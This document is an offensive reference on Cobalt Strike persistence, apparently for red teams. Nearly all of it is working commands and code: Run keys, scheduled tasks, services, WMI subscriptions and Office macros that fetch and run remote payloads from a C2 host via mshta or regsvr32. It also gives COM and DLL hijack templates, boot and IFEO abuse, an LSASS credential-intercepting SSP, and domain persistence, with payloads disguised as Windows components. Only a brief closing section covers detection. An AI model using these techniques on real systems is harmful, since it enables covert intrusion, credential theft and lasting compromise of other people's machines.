# Cobalt Strike — Persistence Techniques (English)

> Comprehensive reference for establishing and maintaining persistent access via Cobalt Strike. Covers registry, scheduled tasks, services, WMI, COM hijacking, DLL hijacking, and boot-level persistence.

---

## Table of Contents

1. [Persistence Philosophy](#1-persistence-philosophy)
2. [Registry Run Keys](#2-registry-run-keys)
3. [Scheduled Tasks](#3-scheduled-tasks)
4. [Windows Services](#4-windows-services)
5. [Startup Folder](#5-startup-folder)
6. [WMI Event Subscriptions](#6-wmi-event-subscriptions)
7. [COM Object Hijacking](#7-com-object-hijacking)
8. [DLL Hijacking (Persistent)](#8-dll-hijacking-persistent)
9. [Office Macros & Add-ins](#9-office-macros--add-ins)
10. [Boot-Level & Driver Persistence](#10-boot-level--driver-persistence)
11. [LSASS Plugin Persistence](#11-lsass-plugin-persistence)
12. [Remote Persistence via Lateral Movement](#12-remote-persistence-via-lateral-movement)
13. [Persistence Detection & Cleanup](#13-persistence-detection--cleanup)

---

## 1. Persistence Philosophy

### Rules of Engagement

- **Match noise to objective:** High-value targets warrant quieter, harder-to-detect persistence (COM hijacking, WMI). Less sensitive targets can use noisier mechanisms (Run keys, scheduled tasks).
- **Use Beacon's native commands** where possible — no extra tools on disk.
- **Avoid writing Beacon directly** — use LOLBin loaders (mshta, wscript, rundll32, regsvr32) that fetch and run shellcode from C2.
- **Timestamp stolen files** using `timestomp` to match surrounding files.
- **Test before leaving** — always verify persistence fires before exiting a critical session.

### Common Persistence Payloads

```
# Stageless EXE — simplest but most detectable
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\updater.exe

# PowerShell one-liner — no EXE on disk
powershell.exe -nop -w hidden -enc <base64_stager>

# mshta.exe — LOLBin fetches HTA payload
mshta.exe http://203.0.113.10/payload.hta

# regsvr32.exe — COM scriptlet
regsvr32.exe /s /n /u /i:http://203.0.113.10/payload.sct scrobj.dll

# rundll32.exe — load Beacon DLL
rundll32.exe C:\ProgramData\svchost.dll,Main

# wscript.exe — run JS/VBS script
wscript.exe "C:\ProgramData\update.js"
```

---

## 2. Registry Run Keys

### User-Level (No Admin Required)

```
# HKCU — runs when this user logs in
beacon> shell reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "mshta.exe http://203.0.113.10/payload.hta" /f

# Verify
beacon> reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

### System-Level (Requires Admin)

```
# HKLM — runs for all users on logon
beacon> shell reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\ProgramData\svchost.exe" /f

# HKLM RunOnce — runs once at next logon then deletes itself
beacon> shell reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v "Setup" /t REG_SZ /d "C:\Temp\install.exe" /f
```

### Stealth Run Key Locations

```
# Less monitored Run key paths:
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
HKCU\Environment\UserInitMprLogonScript

# SetValue in command-line — bypass some monitoring
beacon> shell reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "NotNotepad" /t REG_EXPAND_SZ /d "%%SYSTEMROOT%%\system32\cmd.exe /c start /min mshta.exe http://203.0.113.10/x.hta" /f
```

### Run Key via Aggressor Script

```coffeescript
alias persist_reg {
    local('$bid $host $listener');
    $bid      = $1;
    $host     = beacon_info($bid, "computer");
    $listener = "lab-https";
    
    # Build PS stager string
    $stager = powershell_stager($listener);
    
    bshell($bid, "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"WindowsUpdate\" /t REG_SZ /d \"powershell.exe -nop -w hidden -enc " . base64_encode($stager) . "\" /f");
    btask($bid, "Persistence added via HKCU Run key");
}
```

---

## 3. Scheduled Tasks

### Basic Scheduled Task (User-Level)

```
# Run at logon
beacon> shell schtasks /create /tn "MicrosoftEdgeUpdateTaskMachine" /tr "mshta.exe http://203.0.113.10/payload.hta" /sc onlogon /f

# Run every hour
beacon> shell schtasks /create /tn "WindowsDefenderUpdate" /tr "powershell.exe -nop -w hidden -enc <base64>" /sc hourly /f

# Run at startup (requires admin)
beacon> shell schtasks /create /tn "SecurityHealthSystray" /tr "C:\ProgramData\svchost.exe" /sc onstart /ru SYSTEM /f
```

### Stealthy Scheduled Task (XML-based)

The XML method allows hiding the task author and more granular trigger control.

```xml
<!-- C:\Temp\task.xml -->
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Author>Microsoft Corporation</Author>
    <Description>Windows Maintenance Task</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <TimeTrigger>
      <Repetition>
        <Interval>PT1H</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <Hidden>true</Hidden>
  </Settings>
  <Actions>
    <Exec>
      <Command>mshta.exe</Command>
      <Arguments>http://203.0.113.10/payload.hta</Arguments>
    </Exec>
  </Actions>
</Task>
```

```
beacon> upload /tmp/task.xml
beacon> shell schtasks /create /tn "WindowsMaintenance" /xml "C:\Temp\task.xml" /f
beacon> rm C:\Temp\task.xml
```

### SYSTEM-Level Scheduled Task

```
beacon> shell schtasks /create /tn "WindowsUpdate" /tr "C:\ProgramData\svchost.exe" /sc onstart /ru SYSTEM /rl HIGHEST /f
```

### Query & Manage

```
beacon> shell schtasks /query /tn "WindowsUpdate" /fo LIST /v
beacon> shell schtasks /run /tn "WindowsUpdate"       # trigger now to test
beacon> shell schtasks /delete /tn "WindowsUpdate" /f  # cleanup
```

---

## 4. Windows Services

### Create Persistent Service (Admin Required)

```
# Beacon payload as a service EXE (generate service-compatible payload)
# Attacks → Packages → Windows Service Executable

beacon> upload /opt/payloads/beacon-svc.exe C:\Windows\svchost.exe   # carefully named
beacon> shell sc create "WindowsDefender" binpath= "C:\Windows\svchost.exe" start= auto
beacon> shell sc description "WindowsDefender" "Windows Defender Host Service"
beacon> shell sc start "WindowsDefender"

# Verify
beacon> shell sc query "WindowsDefender"
```

### Service as Command Runner

```
# Create service that runs arbitrary command (temporary — good for lateral movement)
beacon> shell sc create "TempSvc" binpath= "cmd.exe /c C:\Temp\beacon.exe" start= demand
beacon> shell sc start "TempSvc"
beacon> shell sc delete "TempSvc"    # cleanup after Beacon connects
```

### Modify Existing Service Binary Path (Admin + Requires Misconfigured Service)

```
beacon> shell sc qc "SomeVulnerableService"    # check current config
beacon> shell sc config "SomeVulnerableService" binpath= "C:\Temp\beacon.exe"
beacon> shell sc start "SomeVulnerableService"
```

### Service Persistence via PowerShell (Less Detectable)

```
beacon> powerpick New-Service -Name "WinMgmt2" -BinaryPathName "C:\ProgramData\svchost.exe" -DisplayName "Windows Management Instrumentation 2" -StartupType Automatic
beacon> powerpick Start-Service -Name "WinMgmt2"
```

---

## 5. Startup Folder

### User Startup (No Admin)

```
# Place shortcut (.lnk) or payload in user startup folder
beacon> shell copy "C:\Temp\payload.exe" "C:\Users\jsmith\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\updater.exe"
```

### All-Users Startup (Admin)

```
beacon> shell copy "C:\Temp\payload.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\maintenance.exe"
```

### Create LNK Shortcut (Less Suspicious than EXE)

```
beacon> powerpick $ws = New-Object -ComObject WScript.Shell; $sc = $ws.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update.lnk"); $sc.TargetPath = "mshta.exe"; $sc.Arguments = "http://203.0.113.10/payload.hta"; $sc.WorkingDirectory = "C:\Windows\System32"; $sc.Save()
```

---

## 6. WMI Event Subscriptions

WMI persistence is one of the stealthiest mechanisms — survives reboots and runs in the WMI service context (NT AUTHORITY\SYSTEM). No obvious registry keys or files.

### Architecture

```
EventFilter    → defines the trigger (event)
EventConsumer  → defines the action (what to run)
FilterToConsumerBinding → links filter to consumer
```

### Types of Consumers

| Consumer | Description |
|---|---|
| `CommandLineEventConsumer` | Run a command |
| `ActiveScriptEventConsumer` | Run a script (VBS/JS) |

### Setting Up WMI Persistence

```
# Method 1: Via PowerShell (in-memory)
beacon> powerpick $filterName = "SystemUpdate"; $consumerName = "SystemUpdate"; $query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120"; $wmiParams = @{Namespace = 'root\subscription'; Class = '__EventFilter'; Filter = $query; Name = $filterName}; $filter = Set-WmiInstance @wmiParams; $consumerParams = @{Namespace = 'root\subscription'; Class = 'CommandLineEventConsumer'; Name = $consumerName; ExecutablePath = 'C:\Windows\system32\mshta.exe'; CommandLineTemplate = 'C:\Windows\system32\mshta.exe http://203.0.113.10/payload.hta'}; $consumer = Set-WmiInstance @consumerParams; $bindParams = @{Namespace = 'root\subscription'; Class = '__FilterToConsumerBinding'; Filter = $filter; Consumer = $consumer}; Set-WmiInstance @bindParams
```

**Cleaner script version:**

```powershell
# Run via: beacon> powerpick <paste this>
$FilterName    = "WindowsMaintenance"
$ConsumerName  = "WindowsMaintenance"
$C2            = "http://203.0.113.10/payload.hta"

# Trigger: 2 minutes after boot (fires every 60s after that)
$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120"

# Create filter
$FilterArgs = @{
    Name           = $FilterName
    EventNameSpace = "root\cimv2"
    QueryLanguage  = "WQL"
    Query          = $Query
}
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $FilterArgs

# Create consumer
$ConsumerArgs = @{
    Name                = $ConsumerName
    CommandLineTemplate = "mshta.exe $C2"
}
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs

# Bind filter to consumer
$BindingArgs = @{
    Filter   = $Filter
    Consumer = $Consumer
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $BindingArgs
```

```
beacon> powerpick (paste full script)
```

### WMI Persistence via Script Consumer (Even Stealthier)

```powershell
$Script = @"
Set objShell = CreateObject("WScript.Shell")
objShell.Run "mshta.exe http://203.0.113.10/payload.hta", 0, False
"@

$ConsumerArgs = @{
    Name           = "WindowsMaintenance2"
    ScriptingEngine = "VBScript"
    ScriptText     = $Script
}
$Consumer = Set-WmiInstance -Namespace root\subscription -Class ActiveScriptEventConsumer -Arguments $ConsumerArgs
```

### Remove WMI Persistence

```
beacon> powerpick Get-WMIObject -Namespace root\subscription -Class __EventFilter | Where-Object {$_.Name -eq "WindowsMaintenance"} | Remove-WMIObject
beacon> powerpick Get-WMIObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object {$_.Name -eq "WindowsMaintenance"} | Remove-WMIObject
beacon> powerpick Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WMIObject
```

---

## 7. COM Object Hijacking

Hijack a COM CLSID that is looked up in HKCU before HKLM (no admin required).

### Finding Hijackable CLSIDs

```
# Method 1: Look for missing HKCU\CLSID entries that exist in HKLM
beacon> powerpick $HKLM_CLSIDs = Get-ChildItem "HKLM:\SOFTWARE\Classes\CLSID" | Select-Object PSChildName; $HKCU_CLSIDs = Get-ChildItem "HKCU:\SOFTWARE\Classes\CLSID" -ErrorAction SilentlyContinue | Select-Object PSChildName; $Missing = $HKLM_CLSIDs | Where-Object {$_.PSChildName -notin $HKCU_CLSIDs.PSChildName}

# Method 2: Use Seatbelt
beacon> execute-assembly Seatbelt.exe -group=all | Select-String "COM"

# Method 3: Process Monitor (offline analysis)
# Filter: Result = NAME NOT FOUND, Path contains CLSID, HKCU
```

### Well-Known Hijackable CLSIDs

| CLSID | Trigger |
|---|---|
| `{BCDE0395-E52F-467C-8E3D-C4579291692E}` | MMC (mmc.exe) |
| `{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}` | CMSTP |
| `{D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D}` | Explorer.exe |
| `{0A29FF9E-7F9C-4437-8B11-F424491E3931}` | SDCLT (triggers on Explorer open) |

### Executing the Hijack

```
# Example: Hijack {BCDE0395-E52F-467C-8E3D-C4579291692E} for mmc.exe
$CLSID  = "{BCDE0395-E52F-467C-8E3D-C4579291692E}"
$Path   = "HKCU:\SOFTWARE\Classes\CLSID\$CLSID\InprocServer32"

beacon> powerpick New-Item -Path "HKCU:\SOFTWARE\Classes\CLSID\$CLSID\InprocServer32" -Force
beacon> powerpick Set-ItemProperty -Path "HKCU:\SOFTWARE\Classes\CLSID\$CLSID\InprocServer32" -Name "(Default)" -Value "C:\Users\jsmith\AppData\Local\Temp\evil.dll"
beacon> powerpick Set-ItemProperty -Path "HKCU:\SOFTWARE\Classes\CLSID\$CLSID\InprocServer32" -Name "ThreadingModel" -Value "Apartment"
```

The DLL must export `DllRegisterServer`, `DllUnregisterServer`, `DllGetClassObject`. Template:

```c
// evil.dll — minimal COM server
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Execute Beacon shellcode here
    }
    return TRUE;
}
HRESULT WINAPI DllRegisterServer()   { return S_OK; }
HRESULT WINAPI DllUnregisterServer() { return S_OK; }
HRESULT WINAPI DllGetClassObject()   { return S_OK; }
```

---

## 8. DLL Hijacking (Persistent)

Place a malicious DLL in a directory that a legitimate application searches before the real DLL location.

### Finding Hijackable DLLs

```
# Use Process Monitor to find DLLs not found
# Filter: Result = NAME NOT FOUND, Path ends with .dll, Process = target.exe

# Or use Seatbelt:
beacon> execute-assembly Seatbelt.exe DotNet

# Common hijackable paths:
# - Application directory (if writable)
# - C:\Windows\Temp (some apps add to DLL search path)
# - User profile directories
```

### Common Hijack Targets

| Application | DLL | Location |
|---|---|---|
| OneDrive | `cryptdll.dll` | `%LOCALAPPDATA%\Microsoft\OneDrive\` |
| Windows Defender | various | `%ProgramFiles%\Windows Defender\` |
| Office | various | Office install dir |
| Node.js | `node.exe` sideloading | Any writable app dir |

### Proxy DLL

The malicious DLL proxies all exports to the real DLL while running payload on load:

```c
// proxy.dll
#pragma comment(linker, "/export:RealFunction=reallib.RealFunction")

BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        // Execute shellcode
        RunBeacon();
    }
    return TRUE;
}
```

---

## 9. Office Macros & Add-ins

### Excel Add-In (.xla / .xlam) — User-Level Persistence

```
1. Create a macro workbook: Document.xlam
2. Add the macro as a ThisWorkbook.Open event
3. Save to: C:\Users\<user>\AppData\Roaming\Microsoft\Excel\XLSTART\auto.xlam
```

Macro content:
```vba
Private Sub Workbook_Open()
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.Run "mshta.exe http://203.0.113.10/payload.hta", 0, False
End Sub
```

### Word Startup Template (Normal.dotm)

```
1. Modify: C:\Users\<user>\AppData\Roaming\Microsoft\Word\STARTUP\Normal.dotm
2. Add Document_Open() macro
3. Fires every time Word is opened
```

### Outlook VBA Add-In

```
1. Modify: %APPDATA%\Microsoft\Outlook\VbaProject.OTM
2. Add Application_Startup() macro
3. Fires when Outlook launches
```

---

## 10. Boot-Level & Driver Persistence

### Boot Execute Registry Key

Runs before user logon, executed by Session Manager (`smss.exe`):

```
beacon> shell reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v BootExecute /t REG_MULTI_SZ /d "autocheck autochk *\0C:\Temp\bootexec.exe" /f
```

> Requires SYSTEM. Very stealthy — runs before EDR. High-risk; can break boot if payload crashes.

### AppInit_DLLs

```
# Loads DLL into every process that loads user32.dll (≈ every GUI app)
beacon> shell reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\Temp\evil.dll" /f
beacon> shell reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f
```

> OPSEC: Very loud — fires in every GUI process. Rarely used in modern engagements.

### Image File Execution Options (IFEO) — Debugger Hijack

```
# Attach a "debugger" to a legitimate program — Beacon runs instead
beacon> shell reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "C:\Temp\beacon.exe" /f

# More subtle: use GlobalFlag + Silent Process Exit
beacon> shell reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512 /f
beacon> shell reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /t REG_SZ /d "C:\Temp\beacon.exe" /f
```

---

## 11. LSASS Plugin Persistence

### Security Support Provider (SSP) DLL

Load a DLL into LSASS. The DLL persists across reboots, runs as SYSTEM, and can intercept credentials.

```
# Method 1: Registry-based (requires reboot)
beacon> shell reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0evil_ssp" /f

# The evil_ssp.dll must be in %SystemRoot%\System32\
beacon> upload /opt/tools/evil_ssp.dll
beacon> shell copy C:\Temp\evil_ssp.dll C:\Windows\System32\evil_ssp.dll

# Method 2: Live injection (no reboot, Mimikatz)
beacon> mimikatz misc::memssp
```

### Credential Guard Consideration

If Credential Guard is enabled, LSASS runs in a VSM (Virtualization Security Mode) — SSP injection is blocked.

---

## 12. Remote Persistence via Lateral Movement

Apply any of the above persistence techniques on remote systems after lateral movement:

```
# After jumping to DC:
beacon> jump psexec dc01.corp.local lab-https
# (in new Beacon on DC)
beacon> shell schtasks /create /tn "ADReplication" /tr "mshta.exe http://203.0.113.10/payload.hta" /sc onlogon /f
beacon> shell reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WinUpdate" /t REG_SZ /d "C:\Windows\System32\mshta.exe http://203.0.113.10/payload.hta" /f
```

### Domain-Level Persistence

**Group Policy (GPO) — Logon Script:**
```
# Add logon script via GPO modification (requires DA)
# Computer Configuration → Policies → Windows Settings → Scripts → Startup
# User Configuration → Policies → Windows Settings → Scripts → Logon

beacon> powerpick New-GPO -Name "WindowsUpdate" | New-GPLink -Target "DC=corp,DC=local"
```

**AdminSDHolder DACL Modification:**
```
# Add your user to AdminSDHolder DACL → gets DA rights automatically (60 min SDProp cycle)
beacon> powerpick Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" -PrincipalIdentity jsmith -Rights All
```

---

## 13. Persistence Detection & Cleanup

### Detection

```
# Common persistence hunting commands (run from defensive perspective):
schtasks /query /fo LIST /v | findstr /i "task\|status\|run as\|author"
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
wmic /namespace:\\root\subscription path __EventFilter get *
wmic /namespace:\\root\subscription path CommandLineEventConsumer get *
sc query type= all state= all | findstr "SERVICE_NAME\|STATE"
```

### Cleanup from Beacon

```
# Remove Run key
beacon> shell reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /f

# Remove scheduled task
beacon> shell schtasks /delete /tn "WindowsUpdate" /f

# Remove service
beacon> shell sc stop "WindowsDefender"
beacon> shell sc delete "WindowsDefender"

# Remove file
beacon> rm C:\ProgramData\svchost.exe

# Remove WMI subscription
beacon> powerpick Get-WMIObject -NS root\subscription -Class __EventFilter | Where-Object {$_.Name -eq "WindowsMaintenance"} | Remove-WMIObject
```

---

*Last updated: 2026-06-09 | Reference for authorized red team use only.*
